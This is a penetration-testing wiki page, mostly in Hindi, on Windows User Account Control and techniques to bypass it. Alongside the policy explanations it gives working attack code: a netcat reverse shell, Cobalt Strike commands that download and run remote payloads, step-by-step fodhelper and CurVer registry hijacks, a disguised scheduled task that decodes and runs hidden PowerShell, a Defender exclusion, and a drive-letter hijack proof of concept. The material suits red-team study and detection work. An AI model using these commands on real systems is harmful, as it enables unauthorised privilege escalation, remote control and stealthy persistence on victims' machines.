# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसा फ़ीचर है जो उच्चाधिकार वाली गतिविधियों के लिए एक **अनुमति संकेत (consent prompt)** सक्षम करता है। Applications के अलग-अलग `integrity` स्तर होते हैं, और एक प्रोग्राम जिसकी **उच्च स्तर** है वह ऐसे कार्य कर सकता है जो सिस्टम को संभावित रूप से प्रभावित कर सकते हैं। जब UAC सक्षम होता है, तो अनुप्रयोग और कार्य हमेशा एक non-administrator खाते के सुरक्षा संदर्भ में चलते हैं जब तक कि कोई administrator स्पष्ट रूप से इन अनुप्रयोगों/कार्यक्रमों को सिस्टम पर administrator-स्तरीय पहुँच देने की अनुमति नहीं देता। यह एक सुविधा है जो administrators को अनचाहे परिवर्तनों से बचाती है, पर इसे एक सुरक्षा सीमा (security boundary) नहीं माना जाता।

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

जब UAC लागू होता है, तो एक administrator उपयोगकर्ता को 2 टोकन दिए जाते हैं: एक standard user टोकन, जो सामान्य स्तर पर नियमित क्रियाएँ करने के लिए होता है, और एक ऐसा टोकन जिसमें admin privileges होते हैं।

यह [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) बहुत विस्तार से बताती है कि UAC कैसे काम करता है और इसमें logon प्रक्रिया, उपयोगकर्ता अनुभव, और UAC वास्तुकला शामिल हैं। Administrators अपने संगठन के लिए UAC के व्यवहार को स्थानीय स्तर पर security policies के ज़रिए कॉन्फ़िगर कर सकते हैं (secpol.msc का उपयोग करके), या Active Directory डोमेन वातावरण में Group Policy Objects (GPO) के माध्यम से कॉन्फ़िगर करके Push कर सकते हैं। विभिन्न सेटिंग्स का विस्तार यहाँ चर्चा किया गया है: [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)। UAC के लिए 10 Group Policy सेटिंग्स हैं जिन्हें सेट किया जा सकता है। निम्न तालिका अतिरिक्त विवरण प्रदान करती है:

| Group Policy सेटिंग                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | डिफ़ॉल्ट सेटिंग                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (अक्षम)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (सुरक्षित डेस्कटॉप पर गैर-Windows बाइनरीज़ के लिए सहमति का संकेत) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (सुरक्षित डेस्कटॉप पर प्रमाण-पत्रों के लिए संकेत)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (सक्रिय; Enterprise पर डिफ़ॉल्ट रूप से अक्षम)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (अक्षम)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (सक्रिय)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (सक्रिय)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (अक्षम)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (सक्रिय)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (सक्रिय)                                              |

### Policies for installing software on Windows

**Local security policies** (अधिकांश सिस्टम पर "secpol.msc") डिफ़ॉल्ट रूप से इस तरह कॉन्फ़िगर की जाती हैं कि **non-admin users को सॉफ़्टवेयर इंस्टॉल करने से रोका जा सके**। इसका मतलब है कि भले ही कोई non-admin उपयोगकर्ता आपके सॉफ़्टवेयर का इंस्टॉलर डाउनलोड कर ले, वे इसे admin खाते के बिना चला नहीं पाएंगे।

### Registry Keys to Force UAC to Ask for Elevation

एक standard user के रूप में जिनके पास admin अधिकार नहीं हैं, आप यह सुनिश्चित कर सकते हैं कि जब वह "standard" खाता कुछ क्रियाएँ करने का प्रयास करता है तो UAC उन्हें प्रमाण-पत्र (credentials) के लिए प्रेरित करे। इस क्रिया के लिए कुछ रजिस्ट्री कुंजियों को संशोधित करना होगा, जिसके लिए आपको admin permissions की आवश्यकता होगी, जब तक कि कोई UAC bypass न हो, या हमलावर पहले से ही admin के रूप में लॉग इन न हो।

यहां तक कि अगर उपयोगकर्ता Administrators समूह में है, तब भी ये परिवर्तन उपयोगकर्ता को प्रशासनिक कार्य करने के लिए अपने खाते के प्रमाण-पत्र फिर से दर्ज करने के लिए मजबूर करते हैं।

**एकमात्र नकारात्मक पक्ष यह है कि इस दृष्टिकोण के काम करने के लिए UAC को अक्षम होना चाहिए, जो कि production वातावरण में होने की संभावना कम है।**

रजिस्ट्र्री कुंजियाँ और प्रविष्टियाँ जिन्हें आपको बदलना चाहिए निम्नलिखित हैं (कोष्ठकों में उनके डिफ़ॉल्ट मान दिए गए हैं):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

यह Local Security Policy टूल के माध्यम से मैन्युअली भी किया जा सकता है। एक बार बदलने के बाद, प्रशासनिक प्रक्रियाएँ उपयोगकर्ता से उनके प्रमाण-पत्र फिर से दर्ज कराने के लिए संकेत करेंगी।

### Note

**User Account Control is not a security boundary.** इसलिए, सामान्य उपयोगकर्ता बिना किसी local privilege escalation exploit के अपने खाते से बाहर निकलकर administrator अधिकार प्राप्त नहीं कर सकते।

### किसी उपयोगकर्ता से 'full computer access' के लिए पूछें
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC अधिकार

- Internet Explorer Protected Mode integrity checks का उपयोग करता है ताकि high-integrity-level processes (जैसे web browsers) low-integrity-level data (जैसे temporary Internet files folder) तक पहुँचने से रोके जा सके। यह browser को low-integrity token के साथ चलाकर किया जाता है। जब browser low-integrity zone में संग्रहीत डेटा तक पहुँचने की कोशिश करता है, तो operating system process के integrity level की जाँच करता है और तदनुसार एक्सेस की अनुमति देता है। यह फीचर remote code execution attacks को सिस्टम पर संवेदनशील डेटा तक पहुँचने से रोकने में मदद करता है।
- जब कोई user Windows पर लॉग ऑन करता है, तो सिस्टम एक access token बनाता है जिसमें user's privileges की सूची होती है। Privileges को एक user's rights और capabilities के संयोजन के रूप में परिभाषित किया जाता है। token में user's credentials की भी सूची होती है, जो उन credentials का उपयोग कंप्यूटर और नेटवर्क संसाधनों पर user को प्रमाणित करने के लिए किया जाता है।

### Autoadminlogon

To configure Windows to automatically log on a specific user at startup, set the **`AutoAdminLogon` registry key**. This is useful for kiosk environments or for testing purposes. Use this only on secure systems, as it exposes the password in the registry.

Set the following keys using the Registry Editor or `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

To revert to normal logon behavior, set `AutoAdminLogon` to 0.

## UAC bypass

> [!TIP]
> नोट करें कि अगर आपके पास graphical access to the victim है, तो UAC bypass सीधा है क्योंकि आप UAC prompt दिखाई देने पर बस "Yes" पर क्लिक कर सकते हैं

UAC bypass की आवश्यकता निम्न स्थिति में पड़ती है: **UAC सक्रिय है, आपका process medium integrity context में चल रहा है, और आपका user administrators group का सदस्य है**।

यह बताना महत्वपूर्ण है कि यह **काफी अधिक कठिन है UAC को bypass करना अगर वह highest security level (Always) पर हो बनाम अगर वह किसी अन्य level (Default) पर हो।**

### UAC disabled

यदि UAC पहले से disabled है (`ConsentPromptBehaviorAdmin` is **`0`**) तो आप **reverse shell को admin privileges के साथ execute कर सकते हैं** (high integrity level) कुछ इस तरह:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

यदि आपके पास एक shell है जिसमें user Administrators समूह में है, तो आप SMB के जरिए साझा किए गए C$ को एक नए डिस्क पर लोकल (file system) के रूप में **mount the C$** कर सकते हैं और आपको **access to everything inside the file system** मिल जाएगा (यहाँ तक कि Administrator home folder)।

> [!WARNING]
> **ऐसा लगता है कि यह ट्रिक अब काम नहीं कर रही है**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike तकनीकें केवल तभी काम करेंगी जब UAC अधिकतम सुरक्षा स्तर पर सेट न हो।
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में **UAC** को **bypass** करने के लिए कई मॉड्यूल भी हैं।

### KRBUACBypass

डॉक्यूमेंटेशन और टूल: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) जो कई UAC bypass exploits का एक **संकलन** है। ध्यान दें कि आपको **compile UACME using visual studio or msbuild** करने की आवश्यकता होगी। यह संकलन कई executables बनाएगा (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`) , आपको पता होना चाहिए कि **कौन सा आपको चाहिए।**\
आपको **be careful** होना चाहिए क्योंकि कुछ bypasses कुछ अन्य प्रोग्राम्स को **promtp some other programs** कर देंगे जो **user** को **alert** करेंगे कि कुछ हो रहा है।

UACME में वह **build version from which each technique started working** मौजूद है। आप अपनी versions को प्रभावित करने वाली technique खोज सकते हैं:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

विश्वसनीय बाइनरी `fodhelper.exe` आधुनिक Windows पर auto-elevated है। जब लॉन्च किया जाता है, तो यह नीचे दिए गए per-user registry path को बिना `DelegateExecute` verb को validate किए query करता है। वहाँ एक कमांड लगाने से एक Medium Integrity process (user is in Administrators) बिना UAC prompt के एक High Integrity process spawn कर सकती है।

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell कदम (अपना payload सेट करें, फिर सक्रिय करें)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
नोट्स:
- यह तब काम करता है जब वर्तमान उपयोगकर्ता Administrators का सदस्य हो और UAC स्तर डिफ़ॉल्ट/लचीला हो (Always Notify with extra restrictions नहीं)।
- 64-bit Windows पर 32-bit process से 64-bit PowerShell शुरू करने के लिए `sysnative` पथ का उपयोग करें।
- Payload किसी भी कमांड हो सकता है (PowerShell, cmd, या किसी EXE पथ)। Stealth के लिए प्रॉम्प्ट दिखाने वाले UIs से बचें।

#### CurVer/extension hijack variant (HKCU only)

हालिया नमूने जो `fodhelper.exe` का दुरुपयोग करते हैं, `DelegateExecute` से बचते हैं और इसके बजाय प्रति-उपयोगकर्ता `CurVer` मान के माध्यम से **`ms-settings` ProgID को रिडायरेक्ट कर देते हैं**। ऑटो-एलेवेटेड बाइनरी अभी भी `HKCU` के अंतर्गत हैंडलर को resolve करता है, इसलिए keys लगाने के लिए कोई admin token आवश्यक नहीं है:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
एक बार elevated होने के बाद, malware आमतौर पर `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` को `0` पर सेट करके **disables future prompts** कर देता है, फिर अतिरिक्त defense evasion करता है (उदाहरण के लिए, `Add-MpPreference -ExclusionPath C:\ProgramData`) और high integrity पर चलने के लिए persistence पुनः बनाता है। एक typical persistence task डिस्क पर एक **XOR-encrypted PowerShell script** स्टोर करता है और हर घंटे इसे इन-मेमोरी में decode/execute करता है:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
This variant अभी भी dropper को क्लीन कर देता है और केवल staged payloads छोड़ देता है, जिससे डिटेक्शन मुख्य रूप से मॉनिटरिंग पर निर्भर हो जाती है: **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` छेड़छाड़, Defender exclusion बनाना, या ऐसे scheduled tasks जो इन-मेमोरी में PowerShell को डिक्रीप्ट करते हैं।

#### और UAC bypass

**All** यहाँ प्रयुक्त techniques जो AUC को bypass करने के लिए हैं, victim के साथ एक **full interactive shell** की **requirement** रहती है (एक सामान्य nc.exe shell पर्याप्त नहीं है)।

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ काम करना चाहिए)

### GUI के साथ UAC Bypass

यदि आपके पास **GUI** तक पहुँच है तो UAC prompt मिलने पर आप बस उसे स्वीकार कर सकते हैं, आपको वास्तव में bypass की जरूरत नहीं होती। इसलिए, GUI तक पहुँच पाना आपको UAC bypass करने की अनुमति दे सकता है।

इसके अलावा, यदि आपको ऐसा GUI session मिलता है जिसे कोई उपयोग कर रहा था (संभवतः RDP के माध्यम से), वहाँ कुछ tools ऐसे होंगे जो administrator के रूप में चल रहे होंगे जहाँ से आप उदाहरण के लिए सीधे बिना UAC prompt के फिर से दिखाई दिए **cmd** को **as admin** चला सकते हैं, जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). यह थोड़ा अधिक **stealthy** हो सकता है।

### शोर करने वाला brute-force UAC bypass

यदि आपको शोर करने की परवाह नहीं है, तो आप हमेशा [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जैसा कुछ चला सकते हैं जो तब तक permissions elevate करने के लिए अनुरोध करता रहता है जब तक user इसे स्वीकार न कर ले।

### अपना bypass — बुनियादी UAC bypass methodology

यदि आप **UACME** को देखें तो आप नोटिस करेंगे कि ज्यादातर UAC bypasses एक Dll Hijacking vulnerability का दुरुपयोग करते हैं (मुख्यतः malicious dll को _C:\Windows\System32_ पर लिखना)। [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. उस binary को तलाशें जो **autoelevate** करेगा (यानी execute होने पर high integrity level पर चलेगा)।
2. procmon के साथ उन "**NAME NOT FOUND**" events को ढूँढें जो DLL Hijacking के लिए कमजोर हो सकते हैं।
3. संभवतः आपको DLL को कुछ protected paths (जैसे C:\Windows\System32) में **write** करना होगा जहाँ आपके पास लिखने की permissions नहीं होती। आप इसे bypass करने के लिए निम्न का उपयोग कर सकते हैं:
   1. **wusa.exe**: Windows 7,8 और 8.1। यह CAB फाइल की सामग्री को protected paths के अंदर extract करने की अनुमति देता है (क्योंकि यह tool high integrity level से execute होता है)।
   2. **IFileOperation**: Windows 10।
4. अपनी DLL को protected path में copy करने और vulnerable autoelevated binary को execute करने के लिए एक **script** तैयार करें।

### Another UAC bypass technique

यह इस बात को देखने पर आधारित है कि क्या कोई **autoElevated binary** registry से किसी **binary** या **command** के **name/path** को **read** करने की कोशिश करता है जिसे **executed** किया जाना है (यह तब और अधिक रोचक है जब binary यह जानकारी **HKCU** के अंदर खोजता है)।

### Administrator Protection (25H2) — per-logon-session DOS device map के जरिए drive-letter hijack

Windows 11 25H2 “Administrator Protection” shadow-admin tokens का उपयोग करती है जिनके साथ per-session `\Sessions\0\DosDevices/<LUID>` maps होते हैं। यह directory पहली `\??` resolution पर `SeGetTokenDeviceMap` द्वारा lazy तरीके से बनाई जाती है। यदि attacker shadow-admin token को केवल **SecurityIdentification** पर impersonate करता है, तो directory attacker को **owner** के रूप में बनती है (यह `CREATOR OWNER` को inherit करती है), जिससे ऐसे drive-letter links बनाना संभव हो जाता है जो `\GLOBAL??` पर precedence लेते हैं।

**Steps:**

1. Low-privileged session से `RAiProcessRunOnce` कॉल करके एक promptless shadow-admin `runonce.exe` spawn करें।
2. इसके primary token को duplicate करके एक **identification** token बनाएं और `\??` खोलते समय उसे impersonate करें ताकि attacker ownership के तहत `\Sessions\0\DosDevices/<LUID>` बनाई जाए।
3. वहाँ एक `C:` symlink बनाएं जो attacker-controlled storage की ओर पॉइंट करता हो; उस session में subsequent filesystem accesses `C:` को attacker path के रूप में resolve करेंगे, जिससे बिना prompt के DLL/file hijack संभव हो जाएगा।

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## संदर्भ
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
